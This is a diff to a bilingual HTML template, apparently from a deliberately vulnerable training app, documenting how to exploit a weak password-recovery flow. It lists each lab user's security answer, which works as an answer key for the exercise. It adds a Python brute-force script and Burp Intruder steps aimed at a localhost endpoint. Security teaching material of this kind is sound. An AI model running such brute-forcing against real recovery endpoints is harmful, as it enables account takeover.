@@ -46,26 +46,68 @@
   <div class="lang-content" data-lang="es">
     <h3>Pasos de explotación</h3>
     <ol>
-      <li>Introduce un nombre de usuario conocido: <code>admin</code>, <code>alice</code>, <code>bob</code>, <code>charlie</code>, <code>dave</code>.</li>
-      <li>La aplicación muestra la pregunta de seguridad almacenada en texto plano.</li>
-      <li>Adivina o enumera las respuestas (sin rate-limiting): <code>rex</code>, <code>fluffy</code>, <code>sevilla</code>, <code>ceip</code>, <code>max</code>.</li>
-      <li>Con la respuesta correcta, la aplicación revela la contraseña en texto plano.</li>
-      <li>Automatiza con hydra o un script Python para iterar sobre una wordlist de nombres de mascotas.</li>
+      <li>Introduce un nombre de usuario conocido (<code>admin</code>, <code>alice</code>, <code>bob</code>, <code>charlie</code>, <code>dave</code>) en el formulario y pulsa <strong>Continue</strong>.</li>
+      <li>La aplicación muestra la pregunta de seguridad almacenada en texto plano (p.ej. <em>"What is your pet's name?"</em>).</li>
+      <li>No hay rate-limiting: puedes intentar tantas respuestas como quieras.</li>
+      <li>Respuestas conocidas: <code>rex</code> (admin), <code>fluffy</code> (alice), <code>sevilla</code> (bob), <code>ceip</code> (charlie), <code>max</code> (dave).</li>
+      <li>Con la respuesta correcta, la aplicación revela la contraseña en <strong>texto plano</strong>.</li>
+      <li>Automatiza con un script Python para iterar una wordlist de nombres de mascotas:</li>
+    </ol>
+    <pre><code class="language-python">import requests
+
+url_recover  = "http://localhost:5000/recover"
+url_answer   = "http://localhost:5000/recover/answer"
+username     = "admin"
+wordlist     = [line.strip() for line in open("/usr/share/wordlists/rockyou.txt", errors="ignore")]
+
+# Paso 1: obtener pregunta
+r = requests.post(url_recover, data={"username": username})
+
+# Paso 2: iterar respuestas
+for word in wordlist:
+    r = requests.post(url_answer, data={"username": username, "answer": word})
+    if "password" in r.text.lower() and "incorrecta" not in r.text.lower():
+        print(f"[+] Respuesta correcta: {word}")
+        print(r.text)
+        break</code></pre>
+    <ol start="7">
+      <li>También puedes usar Burp Intruder: intercepta POST <code>/recover/answer</code> → Sniper → posición en <code>answer=§§</code> → wordlist de mascotas.</li>
     </ol>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">manual</span> <span class="tools-badge">hydra</span> <span class="tools-badge">Python script</span></div>
+    <div><span class="tools-badge">manual</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Python script</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Exploitation Steps</h3>
     <ol>
-      <li>Enter a known username: <code>admin</code>, <code>alice</code>, <code>bob</code>, <code>charlie</code>, <code>dave</code>.</li>
-      <li>The application reveals the security question stored in plain text.</li>
-      <li>Guess or enumerate answers (no rate-limiting): <code>rex</code>, <code>fluffy</code>, <code>sevilla</code>, <code>ceip</code>, <code>max</code>.</li>
-      <li>With the correct answer, the application reveals the plaintext password.</li>
-      <li>Automate with hydra or a Python script iterating over a pet-name wordlist.</li>
+      <li>Enter a known username (<code>admin</code>, <code>alice</code>, <code>bob</code>, <code>charlie</code>, <code>dave</code>) and click <strong>Continue</strong>.</li>
+      <li>The application reveals the security question stored in plain text (e.g. <em>"What is your pet's name?"</em>).</li>
+      <li>There is no rate-limiting: you can try as many answers as you want.</li>
+      <li>Known answers: <code>rex</code> (admin), <code>fluffy</code> (alice), <code>sevilla</code> (bob), <code>ceip</code> (charlie), <code>max</code> (dave).</li>
+      <li>With the correct answer the application reveals the <strong>plaintext password</strong>.</li>
+      <li>Automate with a Python script iterating a pet-name wordlist:</li>
+    </ol>
+    <pre><code class="language-python">import requests
+
+url_recover  = "http://localhost:5000/recover"
+url_answer   = "http://localhost:5000/recover/answer"
+username     = "admin"
+wordlist     = [line.strip() for line in open("/usr/share/wordlists/rockyou.txt", errors="ignore")]
+
+# Step 1: get question
+r = requests.post(url_recover, data={"username": username})
+
+# Step 2: iterate answers
+for word in wordlist:
+    r = requests.post(url_answer, data={"username": username, "answer": word})
+    if "password" in r.text.lower() and "incorrecta" not in r.text.lower():
+        print(f"[+] Correct answer: {word}")
+        print(r.text)
+        break</code></pre>
+    <ol start="7">
+      <li>Alternatively, use Burp Intruder: intercept POST <code>/recover/answer</code> → Sniper → position on <code>answer=§§</code> → pet-name wordlist.</li>
     </ol>
     <h3>Tools</h3>
-    <div><span class="tools-badge">manual</span> <span class="tools-badge">hydra</span> <span class="tools-badge">Python script</span></div>
+    <div><span class="tools-badge">manual</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Python script</span></div>
   </div>
 </div>
 {% endblock %}
